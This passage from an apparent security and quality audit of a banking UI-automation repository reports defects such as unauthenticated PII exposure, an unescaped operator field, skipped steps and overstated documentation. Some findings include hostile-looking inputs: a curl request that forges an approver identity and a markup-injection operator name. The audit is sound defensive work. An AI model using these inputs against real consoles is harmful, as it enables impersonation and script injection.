`.gitignore:14` ignores `runs/`. `git ls-files evidence/` returns 15 files and
`grep -ril meridian evidence/` returns **nothing**: all seven committed evidence
run dirs are `lookup_member_balance` on the Fairview fixture, and
`evidence/artifact.json` is the fixture artifact (signed `ashishk`, versus
`ashish` on the shipped copy — the committed evidence artifact is not the shipped
one).

**Failure scenario:** a reviewer clones the repo to check
`ADAPTATION.md:47-54`'s table of live outcomes ("success CN…",
"**VALIDATION_REJECTED** live (source share on hold)", "teller1 →
SUPERVISOR_REQUIRED"). There is nothing to check. The dashboard, which reads
`runs/` (`dashboard/app.py:238`), renders empty with all-zero trust stats.
`hands explain <run_id>` errors on every run id the docs cite. The evidence is
real — I ran `hands explain 20260821T092159Z-meridian_funds_transfer-754f17`
locally and it produces a clean receipt for a genuine signed transfer of $1
between MMKT shares of member 100987 — but it exists only on your machine.
Given the brief's own weighting (demoability, communication), this is the single
most expensive defect in the repo and the cheapest to fix.
**Verdict: CONFIRMED (prior #3 confirmed).**

### D-6 · HIGH · `src/hands/surface.py:268` + all 10 artifacts — the two elements that decide whether the answer is *right* are the two that carry no fingerprint

Fingerprint verification is conditional on the ladder having one. In all 10
artifacts, `fingerprint` is `null` on **every** `regions.*` ladder and **every**
`outputs.*.from` ladder — 38 ladders. Only step targets (79 ladders) are
verified. So the identity-binding region (`regions.identity`, which proves you
are looking at the right member) and the value-extraction target (which produces
the number the caller acts on) are resolved with **no** role or editability
check.

**Failure scenario:** `meridian_member_balance`'s `checking_balance` resolves via
a single-rung ladder — `cell_right` of the text `"Share Draft (Checking)"` — with
no fallback rung and no fingerprint. If a MERIDIAN layout change puts a
*Status* cell where the *Balance* cell was, the rung still matches exactly one
visible `td`, no fingerprint objects, and `parse_money("ACTIVE")` raises → the
run fails. That is the good case. If the neighbouring cell instead holds a
different currency figure (an available-balance or hold amount), the run returns
`SUCCESS` with the **wrong number** and full audit chrome. This is exactly the
"wrong-but-confident" outcome invariant #2 exists to prevent, and the mechanism
named as the defence is absent on the only ladder that matters.
**Verdict: CONFIRMED (prior #6: the claim is FALSE).**

### D-7 · HIGH · `src/hands/api.py:133` + `replay.py:681` — brief §3.5's "escalation THROUGH the wrapper" is not met, and `ADAPTATION.md` says it is

`create_api` builds `EngineConfig(runs_dir=Path(runs_dir))`, leaving
`escalation=None`. `_maybe_escalate` immediately re-raises `_StepFailed` when
`hub is None or settings is None`. `api.py` has three routes, none about
interventions. No `EscalationSettings` is constructed anywhere outside
`cli.py:90`.

**Failure scenario:** the chatbot invokes `meridian_place_hold`. The share
dropdown is ambiguous — the exact live situation `ADAPTATION.md:65-69` describes
as the escalation demo. Under the API this returns HTTP 422 `failure`; the
chatbot renders "it failed"; no intervention is raised, no console starts, and
there is no endpoint through which an operator could answer one. The escalation
state machine — the deepest piece of engineering in the repo — is unreachable
from the wrapper the brief asked to reach it through. `ADAPTATION.md:106-108`
claims the wrappers preserve "the escalation state machine".
**Verdict: CONFIRMED (prior #8 confirmed).**

### D-8 · MEDIUM-HIGH · `dashboard/app.py:175-179`, `:301-306`, `:462-467` — unredacted member PII is served over an unauthenticated route

`_summarize_run` globs every `.png`/`.txt` in a run dir into `evidence`; the
detail template inlines each PNG and links each `.txt`; the route serves them
with `send_from_directory`. `surface.capture_evidence` (`surface.py:391-414`)
applies no masking, and `replay.py:222-225` suppresses evidence only during a
human-control window.

**Failure scenario (probed against local data):** `GET
/run/20260820T193514Z-meridian_funds_transfer-03bbcf/evidence/failure-a11y.txt`
returns member name `Lovelace, Ada`, member number `100234`, share ids
`100234-S0001` / `100234-MMKT-4`, and balances `$1,499.00 / $211.54 /
$2,039.01`. No authentication exists on the dashboard, the chatbot, or the
operator console (`app.before_request_funcs` is empty; no token check in
`escalation.py`). Loopback-only today, so the practical severity is bounded —
but this is a financial-services demo whose headline is "trust", and the
committed docs assert "never persist secrets or raw PII to artifacts or logs"
(`DESIGN_DOC.md:118-120`). Path traversal was tested and is **not** possible
(nine payloads, all 404 — `:289`/`:304` reject `..` and Werkzeug `safe_join`
backs them up). Symlinks inside a run dir *are* followed (`:306`).
**Verdict: CONFIRMED.**

### D-9 · MEDIUM-HIGH · `chatbot/app.py:100-106`, `:127-144`, `:27` — the raw utterance goes to the model, and the model picks the amount of an irreversible transfer under one shared identity

Three compounding issues in one path:

1. `_route` sends `{"role":"user","content": utterance}` verbatim to the
   provider. `chatbot/app.py:8-10` claims credentials are never spoken by the
   user or the model. **Scenario:** a teller types "sign on as teller1 password
   Tr0ub4dor and transfer 500" — the password is now in a provider request body
   and its logs, even though the tool schema would never have asked for it.
2. `handle` invokes `meridian_funds_transfer` (risky step `s13` "Post the
   transfer") directly from one model turn, with **no confirmation step**. An
   LLM-chosen `amount`/`to_share` is posted with only `_validate_params`'
   regex between it and the money. The invariant "no model in the decision
   loop" holds — the model is genuinely outside replay — but "it cannot invent
   an amount" (`DEEPDIVE:412-414`) is wrong: inventing the argument values *is*
   what a router does.
3. `SESSION_OPERATOR = "teller1"` is hardcoded (`:27`) and injected at
   `:138-139`, so every transfer from every chat user is attributed to one
   identity. Combined with D-12, nothing in the system knows who acted.

Secondary: `:106` takes `turn.tool_calls[0]` and silently drops the rest, so a
model emitting two transfers executes one and the other vanishes untraced.
**Verdict: CONFIRMED (code-traced).**

### D-10 · MEDIUM · `src/hands/replay.py:849-851` — `_resume_scan` can skip steps, including risky ones, and return SUCCESS

After a hand-back the scan returns `i + 1` for the **furthest** step whose
postconditions hold, then falls through to `_verify_checkpoint` and
`Success(outputs=...)`. Postconditions are the only gate, and nothing requires
that the *intervening* steps ran.

**Failure scenario:** a capability escalates at step 4 of 13. The operator
approves without acting. Step 11's postcondition is
`role_name_visible(heading, "MEMBER RECORD")` — a heading also present on the
page the flow is currently sitting on. The reverse scan matches step 11, returns
12, the engine runs only step 12–13, the checkpoint (member record + identity)
passes, and the caller receives `SUCCESS` for a transfer whose amount and
target share were never entered. The risky-step guard at `:852-861` only fires
when *no* frontier is found, so a false frontier bypasses it entirely.
**Verdict: PLAUSIBLE.** Not reachable in the current artifacts — the MERIDIAN
step postconditions use distinct headings (`MAIN MENU`, `MEMBER INQUIRY /
SELECTION`, `MEMBER RECORD`, `CONFIRM FUNDS TRANSFER`, `TRANSFER POSTED`) — so
this is a latent trap that a single duplicated heading in a future artifact
would arm.

### D-11 · MEDIUM · `tests/test_escalation.py:130` — flaky test in the escalation suite (~12–25%)

`test_human_fixes_blocking_state_and_hands_back` failed 1 of 4 full-suite runs
and 1 of 8 isolated runs, with
`Failure(... expected='an operator decision within 30.0s', observed='intervention
unanswered; session closed')`. `pytest-randomly` is not installed, so this is
not ordering — it is a real race between the scripted operator thread's
`await → take → act → sleep(0.5) → handback` sequence and the engine's
park/TTL loop.

**Failure scenario:** CI goes red at random on a repo whose central claim is
determinism. Worse for you specifically: a reviewer who runs `pytest` once and
hits the 1-in-5 is looking at a red suite under a README that says "85 tests"
while 105 collect. **Verdict: CONFIRMED.**

### D-12 · MEDIUM · `src/hands/escalation.py:299`, `:275` — operator identity is attacker-chosen free text, and injecting it into the console HTML is unescaped

`operator = get("operator", "operator")` takes the approver's name from the POST
body and feeds it to `hub.decide(...)`; `op` is then substituted into
`_PAUSED_CONTROLS.format(op=op)` and rendered into an HTML `value=` attribute
with no escaping.

**Failure scenario:** `curl -d 'operator=alice' http://127.0.0.1:8321/approve`
records Alice as having approved an irreversible step she never saw — the
attributed-exit record that `DEFENSE.md:119` presents as the accountability
guarantee is self-asserted. Separately, an operator name containing `{` raises
inside `str.format` and 500s the console handler; one containing
`"><script>` injects markup. `DEEPDIVE:578-585` volunteers the auth gap
honestly; the format-injection is not documented.
**Verdict: CONFIRMED.**

### D-13 · MEDIUM · `src/hands/conditions.py:141-149` — recognizer precedence between two simultaneous matches is artifact list order

`check_recognizers` returns the first match in `armed` order, with no precedence
between `business_outcome` and `recoverable`.

**Failure scenario:** a capability arms both `cond_session_expired`
(recoverable) and `cond_validation_rejected` (business outcome). A slow
confirmation page shows the validation banner while the session-expiry heading
is also present. Whichever appears first in the artifact's `conditions` array
decides whether the run recovers-and-retries or terminates with a business
outcome. Deterministic given the artifact, but semantically arbitrary and
undocumented — and it is a coin-flip written into a JSON array's ordering.
**Verdict: CONFIRMED (code-traced).**

### D-14 · MEDIUM · `src/hands/replay.py:199-205` — an infrastructure failure escapes the five-way taxonomy

`surface.start()` is inside the `try`, but the only handlers are `_Recognized`
and `_StepFailed`. A `PlaywrightError` from `sync_playwright().start()` or
`chromium.launch()` propagates raw out of `engine.run()`. `api.py:181` catches
only `ValueError`.

**Failure scenario:** Chromium is not installed, or the sandbox is out of file
descriptors. `POST .../invoke` returns a Flask **500** with a stack trace
instead of one of the five contract results. Additionally,
`self.blocked_requests` is initialized only in `start()` (`surface.py:182`), so
if the launch fails before that line the `except` arms at `replay.py:204`/`:209`
raise `AttributeError` while handling the original error. The docs' promise that
"a caller can enumerate every code it may receive" (`CLAUDE.md:28`) has a sixth,
unenumerated state: an untyped 500. **Verdict: CONFIRMED (code-traced).**

### D-15 · MEDIUM · `dashboard/app.py:224-227` — the "moves money / irreversible" badge is an intent-substring heuristic and is already wrong on a shipped artifact

The rule is `s.risk == "risky" and "sign on" not in s.intent.lower()`.

**Failure scenario:** `lookup_member_balance`'s step `s2` has intent
`"Click search"` and `risk: "risky"`, so the read-only balance lookup is badged
**"moves money / irreversible"** — cry-wolf on the one card element a
non-engineer uses to spot a money-mover. Symmetrically, a genuinely irreversible
step named "Sign one-time payment" would be silently stripped of the badge. The
artifact already carries the authoritative `risk` label; the heuristic
overrides it with a string match. **Verdict: CONFIRMED.**

### D-16 · MEDIUM · `dashboard/app.py:43`, `:165-167` — "No AI used ✓" is derived from four hardcoded event-name substrings

`_MODEL_MARKERS = ("llm","model","planner","discovery")` matched against event
names. It classifies all 94 local traces correctly today, but the claim is
unfalsifiable by construction: a model call that emits no trace event, or one
named `prompt_sent`, still renders "No AI used ✓". `dashboard/app.py:429`
asserts this is "counted from the tamper-evident log". The actual proof of the
invariant is `tests/test_zero_llm.py`, which the dashboard never surfaces.
`cli.py:212-214` has the same weakness in `hands explain`.
**Verdict: CONFIRMED.**

### D-17 · MEDIUM · brief §"exceptional states" vs the MERIDIAN artifacts — most named states have no recognizer and land in the default bucket

See A.3 for the full matrix. The sharpest cases: `meridian_sign_on` and
`meridian_update_contact` declare **zero** outcomes and **zero** conditions.

**Failure scenario:** a chatbot user updates a member's email to `not-an-email`.
MERIDIAN rejects it server-side. `meridian_update_contact` has no recognizer,
so `s12`'s postcondition never holds, the step budget expires, and the caller
gets `failure / "postconditions still unmet at …"` with a screenshot — for what
the brief explicitly names as a *natural error* requiring deliberate reporting.
Identically, a wrong password on `meridian_sign_on` is a hard failure, not
`INVALID_CREDENTIALS`. `ADAPTATION.md:100-102` and `:139-140` admit the injected
500/503/permission/timeout gap; they do not admit the bad-login and
invalid-contact gaps, which are the two most likely things a demo audience would
try. **Verdict: CONFIRMED (prior #10 confirmed).**

### D-18 · MEDIUM · `docs/BUILD_PLAN_CONTEXT.md` gitignored — no reviewer can read what "correct" means

`.gitignore:18` excludes the only verbatim statement of the requirements. Every
committed description of the target is a paraphrase written by the candidate.

**Failure scenario:** a reviewer opens the repo to judge coverage and has no
independent yardstick — so `README.md:42`'s "All 7 target functions live" is
self-scored against a self-authored spec. For a repo whose entire thesis is
"auditable, verifiable, don't-trust-me", this is a structural hole in the
argument. **Verdict: CONFIRMED (prior #4 confirmed).**

### D-19 · LOW-MEDIUM · `capabilities/lookup_member_balance.json` vs `capabilities/generated/lookup_member_balance.json` — two different artifacts share one `name`

Top-level: 2 steps, **0** risky, 3 outcomes, 5 conditions (3 business + 2
recoverable), hand-authored. `generated/`: 2 steps, **1** risky (`s2`), 1
outcome, 1 condition, LLM-discovered. Both declare `"name":
"lookup_member_balance"`. README steps 2–4 use `generated/`; steps 5–6 use the
top-level file. The API loads only `generated/`.

**Failure scenario:** a reviewer follows the README, sees the session-expiry
recovery work at step 5, then calls `POST
/capabilities/lookup_member_balance/invoke` expecting the same capability and
gets one with no recovery, no `VALIDATION_REJECTED`, no `PERMISSION_DENIED`, and
a risk gate. Same name, different contract, silently. Relatedly,
`api._load_catalog:50-52` swallows `OSError`/`ValueError` and `continue`s, so an
artifact that fails integrity validation vanishes from the catalog rather than
erroring. **Verdict: CONFIRMED.**

### D-20 · LOW · `README.md:103` — the documented demo step rewrites a tracked file

`hands review capabilities/generated/lookup_member_balance.json --operator you`
calls `args.artifact.write_text(...)` (`cli.py:121`), replacing the committed
`reviewed_by: "ashish"` signature and dirtying `git status`. A reviewer
following the README verbatim leaves the repo modified.
**Verdict: CONFIRMED (code-traced).**

### D-21 · LOW · all 8 MERIDIAN artifacts — `s3` "Click Sign On" is `risky`, which dilutes the risk signal

`planner._RiskWatch` marks any non-GET step risky, so sign-on is risky
everywhere. Consequence: `meridian_member_balance` — a pure read — cannot replay
unattended without a human-signed risk review, and `hands explain` shows a
`(risky)` step on a balance lookup. The genuinely irreversible steps (`s12`/`s13`)
are correctly labelled, so the mechanism works; it is the signal-to-noise that
suffers. Mutating-by-default is a defensible posture — say so explicitly rather
than letting a reviewer conclude the labels are indiscriminate.
**Verdict: CONFIRMED.**

### D-22 · LOW · `dashboard/app.py:172-173` — an unverifiable legacy trace renders no tamper chip at all

`_TRUST_CHIPS` branches on `'intact'` and `'broken'`; `'legacy'` falls through
silently, so "not checked" looks identical to "checked and clean". 48 of the 94
local run dirs are unchained. `cli.py:210` handles this case explicitly; the
dashboard should mirror it. **Verdict: CONFIRMED.**

### D-23 · LOW · `evals/run_evals.py:144-176` — the discovery economics row is read from a committed file, not measured

`json.loads((REPO/"evidence"/"discovery-report.json").read_text())` supplies
"model calls 3 / tokens 3462 / wall clock 3.87s", presented in the same table as
eight live-measured rows. The value is real (it came from a real run) but it is a
record, not a measurement, and re-running the evals cannot falsify it — the
`3.87s` was byte-identical across my run and the committed copy while every
other latency moved. Label it. **Verdict: CONFIRMED.**

### Priors that are FALSE or misdirected

- **Prior #12 is FALSE.** Every README demo path exists on disk. I ran steps 3
  and 4 verbatim against the offline fixture and got the documented output
  exactly (`{"result":"success","outputs":{"savings_balance":"52.00"}}` and
  `MEMBER_NOT_FOUND` with match evidence). The `capabilities/` vs
  `capabilities/generated/` split in steps 5–6 is intentional, not a broken
  path — the real problem is D-19 (two artifacts, one name). All three
  `ADAPTATION.md` run-block modules import cleanly (`hands.api`,
  `dashboard.app`, `chatbot.app`), and `python -m hands.api --help` works.
- **Prior #5 is REFUTED as stated.** `docs/DEFENSE.md:105-120` contains no
  multi-tenant, region, sharding, SLA or deployment-topology claim — it is the
  locator-ladder Q&A. There is no geographic-region or sharding claim anywhere
  in the four deep docs. But the lines you pointed at do contain **two real
  false mechanism claims**, both in the B table: the fingerprint does not
  include "region" (`artifact.py:114-120` has only `role`/`editable`), and "the
  CSS rung is disabled entirely when the replay tenant differs from the
  recording tenant" describes a mechanism that does not exist — there is no
  tenant identity at replay at all (`grep -rn tenant src/hands/` → one
  docstring). So: right instinct, wrong lines, and the actual defects are worse
  than "designed-not-built" — they are stated as present-tense mitigations for
  the wrong-answer risk.
- **Prior #11 is CONFIRMED as an artifact bug, not an engine bug — and the
  engine behaved correctly.** `meridian_member_balance` anchors **both** the
  `output_checking_balance` region and the `checking_balance` output ladder on
  `TextRung("Share Draft (Checking)")`. `surface._anchor:287-295` raises
  `TargetAmbiguous` on >1 visible match rather than guessing, which is exactly
  invariant #1 working. The mechanism for "flakes about half the time" is that
  the shared MERIDIAN instance was **mutable and hammered by other candidates**:
  when a member had one Share Draft the anchor resolved uniquely; when someone
  opened another, it matched 2–3 and the run failed hard. Your local trace
  confirms the shape — `anchor text='Share Draft (Checking)' matched 2 visible
  elements`. So the engine refused to guess, correctly; the artifact chose a
  non-unique anchor and gave it no fallback rung and no fingerprint. The fix is
  an anchor scoped to the shares table row by share **ID**, or a second rung.
  Note `BUILD_PLAN_CONTEXT.md:76` records the belief that this anchor was
  "unique on the page" — that assumption was the defect.
- **Prior #1 is CONFIRMED** and slightly worse than stated: three files say 85
  (`README.md:128`, `CLAUDE.md:46`, `DESIGN_DOC.md:204`); the suite collects and
  passes **105**. `DESIGN_DOC.md:204`'s parenthetical list of areas also omits
  `test_api_boundary.py`, `test_audit_controls.py` and `test_replay_e2e.py`.
- **Prior #2 is CONFIRMED**, with credit due: `recorded_by` is `null` in all 10
  artifacts and `same_operator` returns `False` whenever either side is `None`
  (`artifact.py:540-545`), so the four-eyes half of the control cannot fire
  anywhere in the repo — every artifact is effectively self-approved by
  `ashish`. The **tamper-binding** half does work and is properly tested
  (`tests/test_audit_controls.py:104-125`). Both user-facing surfaces are
  honest about the gap: `cli.py:126-131` prints "the four-eyes check cannot bind
  on this artifact" and `cli.py:194-195` renders "maker unknown -- four-eyes not
  bindable". The docs (`README.md:57-58`, `ADAPTATION.md:112-115`) are the only
  place that overclaims.

---

## D. THE HONEST ONE-PAGER

**What this system genuinely does that is hard.**

It refuses to guess, and it pays the price for that refusal in the one place
where it counts. A locator ladder resolves role → label → text → geometric →
CSS, counting matches over **visible elements only**, treating zero as "try the
next rung" and more than one as a **hard failure** — and when a geometric
relation produces a tie, it returns every tied candidate so the caller must
refuse, rather than silently taking DOM order (`surface.py:330-337`). That
last detail is three lines of code that almost nobody writes, and it is the
difference between an automation you can put in front of a bank and a demo.

It separates *the answer was no* from *the machine broke*. The result contract is
a five-member discriminated union; a business outcome carries auditable match
evidence naming the condition, the region, and the matched text, so a reviewer
can check a classification instead of trusting it. Recognizers are armed per
step range, matched only inside named regions (never bare page text), and
governed by a two-halved freshness rule — a match present before an action
cannot classify that action, and suppression lifts once the stale state is
observed gone. That rule is the difference between "no member matches" answering
the search you just ran and answering the one before it.

It makes the no-model-at-replay claim falsifiable instead of rhetorical. A
hermetic test replays in a fresh subprocess with key-shaped env vars stripped
and non-loopback sockets blocked; a second test verifies the API's import purity
in a *separate* subprocess because the in-process version false-positived once
the discovery tests had run. Someone found that bug and fixed it properly. The
schema is a real contract with load-time integrity validators — outcome-code
closure in both directions, checkpoint identity binding, every declared
parameter provably used, region references resolved — so a malformed capability
fails at load, not mid-flow. The risk review is a SHA-256 over the whole
artifact including both identities, so editing one step voids the approval; all
nine signatures currently verify. And it does not scrape the hidden
per-transaction token: it clicks the real button and lets the browser post the
form, which is both simpler and more honest than the alternative.

The engineering that impressed me most is the escalation control token: the
engine owns it, the HTTP console can only post *requests*, and the parked engine
thread executes the operator's commands on their behalf because the Playwright
sync API is thread-affine. One driver at every instant, by construction rather
than by discipline. The measured eval table reproduces on a clean machine: 10
scenarios, all classified as expected, 10/10 stability.

**The shortest accurate statement of what it does not do.**

*One of seven MERIDIAN capabilities was actually discovered by the LLM loop.*
`meridian_member_balance` came through discovery end-to-end. Six were authored
by hand through the schema (`scripts/build_capabilities.py`), reusing that
capability's verified 7-step prefix; the seventh — `meridian_funds_transfer`,
one of the two MUST-HAVEs — was hand-written directly in JSON, outside even the
script. The `meridian_sign_on` discovery run failed and its artifact is the
script's substitute. Record-once/replay-many is demonstrated once, on the
fixture and once live; the other six are a demonstration that the *schema*
generalizes, which is a different and smaller claim.

*None of the MERIDIAN evidence is in the repository.* `runs/` is gitignored and
`evidence/` contains only Fairview fixture runs. Every "live-verified" claim in
`ADAPTATION.md` is real on your laptop and unverifiable from a clone, and the
dashboard — which reads `runs/` — renders empty for anyone else.

*The safety story has three specific holes.* The network allowlist is
page-scoped, so a popup or new tab escapes it silently and unlogged, while four
documents claim context scope. The idempotency key is checked outside the invoke
lock, so two concurrent retries of a transfer both execute. And the trace hash
chain does not protect its own final record — the one carrying the result — so
that record can be rewritten in place while `verify_chain` still reports intact
and the dashboard still shows "Log tamper-evident ✓".

*The claim "every element is fingerprint-verified" is false exactly where it
matters.* Every region ladder and every output ladder in all ten artifacts has
`fingerprint: null`. The identity-binding region and the value-extraction target
— the two elements that determine whether the answer is correct — are the two
that carry no verification.

*Escalation is not reachable through the wrapper the brief asked for.* The API
never constructs escalation settings and exposes no intervention endpoint;
attended mode is CLI-only.

*Most of the brief's exceptional states are not classified on MERIDIAN.* Six
business outcomes and one recoverable condition across eight capabilities. No
recognizer for maintenance 503, server 500, bad login, or invalid contact
details — the last two being the first things a demo audience would try. The
taxonomy is fully exercised on the self-authored fixture and thinly exercised on
the real target.

*Three doc counts are wrong and several designed-but-unbuilt features are
written in the present tense.* "85 tests" (it is 105) appears in three files;
the taxonomy is called three-way in four places and five-way in two; native
dialog handling, `{secret:}` tokens, per-step approval, taint masking, overlays,
drift health files, and a "Policy component" are all described as existing.
`CLAUDE.md`, `REPORT.md` and `ARCHITECTURE_DEEPDIVE.md` mostly get this line
right; `DESIGN.md` and `DEFENSE.md` mostly do not.

---

## E. FORWARD OPTIONS

Three materially different paths. I am not choosing.

### Option 1 — Stop adding features and make the existing claims true

**What it takes.** Roughly a focused week. Five code fixes, none large: move the
idempotency check-and-reserve inside `_INVOKE_LOCK`; change `page.route` to
`context.route` and add a popup handler; chain the final trace record by writing
a terminal `chain_tip` record (or emit the tip into the invoke envelope, which
`DEEPDIVE:617` already proposes); make `_StepFailed` only become
`POLICY_VIOLATION` when a blocked request plausibly caused *that* failure, and
capture evidence either way; add fingerprints to every region and output ladder
and give `meridian_member_balance`'s balance anchor a second rung. Then fix the
flaky escalation test properly (poll for the state transition instead of
sleeping). Then the documentation pass: correct 85 → 105 in three files, resolve
three-way/five-way, mark every designed-not-built feature as such in `DESIGN.md`
and `DEFENSE.md`, and rewrite the provenance sentences so "all 7 live" becomes
"1 discovered, 6 authored through the schema". Finally — and this is the highest
value-per-hour item in the entire audit — commit a curated `evidence/meridian/`
tree: one successful transfer receipt, one `VALIDATION_REJECTED`, one
`SUPERVISOR_REQUIRED`, one escalation with TTL expiry, plus a
`docs/REQUIREMENTS.md` reproducing the brief. Add `--runs-dir` support so the
dashboard can point at `evidence/`.

**What it proves.** That your claim surface is trustworthy — which is the actual
product here. A reviewer who can verify five claims stops checking the sixth. It
also converts the repo from "impressive, unverifiable" to "impressive,
verifiable", which is the only version that survives a skeptical read.

**What it risks.** Nothing technically. The risk is emotional: it feels like
going backwards, it produces no new demo, and you will be tempted to stop
halfway. There is also a real risk that a reviewer diffs the before/after and
reads the corrections as an admission — the mitigation is to own it in the
commit messages, which reads as senior rather than defensive.

**Who it would impress.** Staff-plus engineers, security reviewers, anyone who
has been burned by a demo that did not survive contact. This is the option that
maps to how the interface.ai brief actually weighted things: adaptation quality
and core-loop correctness over breadth.

### Option 2 — Close the discovery loop: make record-once real for all seven

**What it takes.** Two to three weeks. Write the six missing request files. Fix
the specific thing that broke `meridian_sign_on` discovery — `allow_unbound_checkpoint`
is not plumbed through `recorder.assemble`, so any capability without record
identity fails distillation (that is an inference from the trace, worth
confirming first). Teach the recorder to discover multi-screen review→post
flows, which is the real work: the transfer and hold capabilities have 13 steps
across three screens with a confirmation gate, and discovery has only ever
proven a 7-step single-screen read. Then a discovery run per capability per
declared outcome — which needs a target. MERIDIAN is gone, so this means
building a local MERIDIAN-shaped fixture (server-rendered tables, numbered menu,
hidden token, `?inject=` faults, session timeout) and discovering against that,
which is honest as long as you say the target is self-authored. Add recognizers
for the injected fault kinds and the natural errors while you are there.

**What it proves.** The thesis. "An LLM works it out once, then never again" is
currently evidenced once; this makes it seven times across flows of genuinely
different shape, including two irreversible ones. It also stress-tests the
recorder's live-verification discipline against multi-screen flows, which is
where distillation actually gets hard and where you would learn the most.

**What it risks.** It is the option most likely to stall. Discovery on 13-step
flows may need real planner work, not configuration, and you could spend two
weeks and end with four capabilities and a longer Cuts section. Building the
fixture also re-opens the "self-authored target" criticism you already took once.
And it does nothing about Option 1's list, so you would be adding depth on top
of claims that are still not true.

**Who it would impress.** Applied-AI and agent-infra people — the ones who care
whether the discovery loop is real or a demo. It is the most intellectually
honest use of the codebase and the least legible to a generalist recruiter.

### Option 3 — Reframe as a defensible library and cut the demo surface

**What it takes.** One to two weeks, mostly deletion. Extract `artifact.py`,
`surface.py`, `conditions.py`, `values.py`, `results.py`, `replay.py`,
`trace.py`, `escalation.py` as the shipped library: a typed capability schema
plus a deterministic replay engine with a five-way result contract, a
never-guess locator ladder, a hash-bound risk gate, and a human-handoff control
token. Keep the fixture, the evals, and the 105 tests. Move `discover.py` /
`planner.py` / `recorder.py` behind an explicitly-experimental flag, and either
delete `dashboard/` + `chatbot/` or move them to `examples/` with a clear "demo
quality, not audited" banner — which honestly resolves D-8, D-9, D-15 and D-16
in one stroke instead of hardening three wrappers you do not need. Publish it
with a README whose first line is the ladder discipline and the zero-LLM proof,
not the MERIDIAN story. Write one blog post: "the three lines that stop a UI
automation from returning the wrong balance."

**What it proves.** Taste and judgement. It says: I know which 3,000 lines of
this are excellent and which 1,500 are demo scaffolding, and I am willing to
delete the part that looks impressive to keep the part that is correct. It also
gives you something with an installable surface and a genuine test suite, which
reads very differently from a take-home repo.

**What it risks.** You throw away the two artifacts that make the work *legible*
to non-experts — the chatbot and the dashboard are what a founder or recruiter
actually looks at, and "record-once/replay-many for legacy banking UIs, driven
from chat" is a much better story than "a locator resolution library". It also
abandons the MERIDIAN adaptation as a headline, which was the thing that got you
flown to SF. If your next audience is a hiring manager rather than a staff
engineer, this is the wrong trade.

**Who it would impress.** Infrastructure and platform engineers; open-source
reviewers; anyone evaluating whether you can scope. Least impressive to
generalist recruiters and to founders who buy demos.

---

## F. EXHAUSTIVE GAP REGISTER — requirements → execution

Sections A–E judge the code and the claims. This section closes the loop on
**execution**: what the artifacts actually declare field by field, what the 95
recorded runs actually did, and whether every shipped deliverable and asset
does what it is captioned as doing. Everything here is measured from the local
`runs/` tree, the committed artifacts, and the committed assets.

### F.1 The 7 required functions — field-level gaps

Brief §A lists each function with its inputs. Comparing those to the artifacts'
declared `parameters` and `outputs`:

| # | brief's function and inputs | artifact | field-level gap |
|---|---|---|---|
| 1 | Sign on / session — operator id, password, **branch** (MAIN-001 default) | `meridian_sign_on` | **MISSING `branch`.** Params are `operator_id`, `password` only. `BUILD_PLAN_CONTEXT.md:81` records the branch `<select>` exists on the page; the capability never touches it and silently relies on the default. The one function whose spec explicitly names a dropdown has no `select` step. |
| 2 | Member inquiry — by member number **OR** last name | `meridian_member_lookup_by_name` (+ prefix embedded in all 8) | **MET.** By-number is the shared prefix; by-name uses a real `select` step ("Search by last name"). Both paths covered. |
| 3 | Member record / balance — **shares, balances, status** | `meridian_member_balance`, `meridian_account_inquiry` | **PARTIAL.** Extracts one scalar (`checking_balance`), plus name/email in `account_inquiry`. No share list, no share IDs, **no `status`** — and status is what tells you member 100234's share is on HOLD, which the brief calls out as seed data. Function 3 reads *a* balance, not the shares table. |
| 4 | Funds Transfer — from-share, to-share, amount, **memo** → review → post | `meridian_funds_transfer` | **PARTIAL.** `memo` is absent from `parameters`. Review→post is real: 13 steps, 2 `select`, s12 Continue → s13 "Post the transfer" (`risky`). |
| 5 | Open New Share — share type, initial deposit → review → post | `meridian_open_new_share` | **MET.** `share_type` (select), `initial_deposit`, 12 steps, s12 risky. |
| 6 | Update Member Information — email, phone, address | `meridian_update_contact` | **PARTIAL.** All three params present — but **`outputs: []` and `outcomes: {}`**. It cannot return what it saved and cannot report a rejection. A capability that mutates and confirms nothing. |
| 7 | Place Account Hold — share, reason code, notes → review → post; RISKY + **SUPERVISOR override** | `meridian_place_hold` | **MET.** All three params, 2 `select`, s13 risky, `SUPERVISOR_REQUIRED` outcome. The best-specified of the eight. |

**Net:** 3 of 7 fully match the brief's field list (2, 5, 7); 4 have a named
input or output missing (1: branch, 3: shares/status, 4: memo, 6: outputs +
outcomes). None of these gaps is disclosed in `ADAPTATION.md`'s registry table
at `:47-54`, which reports every row as delivered.

### F.2 Must-haves 3.1–3.6 — sub-item gaps

| item | sub-requirement | verdict | gap |
|---|---|---|---|
| 3.1 | one capability per function | MET (9 artifacts) | — |
| 3.1 | **via the discovery loop** | **PARTIAL** | 1 of 7 MERIDIAN functions discovered. See A.1. |
| 3.2 | invoke by name | MET | — |
| 3.2 | typed args | MET | `_validate_params` + per-param `pattern` |
| 3.2 | structured result | MET | 5-way envelope + `effective_artifact_sha256` |
| 3.2 | agent-callable catalog | MET | `?format=tools` |
| 3.3 | request → capability invocation | MET | `chatbot/app.py:100-144` |
| 3.3 | reports success/error/**escalation** in plain language | **PARTIAL** | Escalation can never occur via the API (D-7), so the chatbot's escalation branch is dead code by construction. |
| 3.4 | catalog | MET | — |
| 3.4 | run history (**discovery + replay**) | MET | dashboard distinguishes "learning run" from production |
| 3.4 | inputs/outputs | MET | masked per artifact flags |
| 3.4 | status | MET | — |
| 3.4 | evidence | MET locally, **empty on a clone** (D-5) | reads gitignored `runs/` |
| 3.5 | route allowlist | **PARTIAL** | page-scoped (D-3) |
| 3.5 | risky-action conservatism | MET | — |
| 3.5 | no secrets/PII | **PARTIAL** | unredacted evidence served (D-8) |
| 3.5 | evidence | MET | screenshot + a11y snapshot on failure |
| 3.5 | **escalation THROUGH the wrapper** | **NOT MET** | D-7 |
| 3.6 | demoable end-to-end | MET locally | — |
| 3.6 | ≥1 exceptional-state run | MET locally | 13 business-outcome runs recorded |
| 3.6 | ideally 1 escalation | MET locally | 1 TTL-expiry run recorded |

### F.3 The measured execution record — the number the docs never state

95 run directories exist locally (17 discovery, 78 replay; 94 carry a trace).

**Discovery, per target:**

| capability | attempts | distilled | rate |
|---|---|---|---|
| `lookup_member_balance` (fixture, happy + outcome) | 4 | 4 | **100%** |
| `meridian_member_balance` (happy leg) | 10 | 3 | **30%** |
| `meridian_member_balance` (not-found leg) | 2 | 1 | 50% |
| `meridian_sign_on` | 1 | **0** | **0% — failed** |
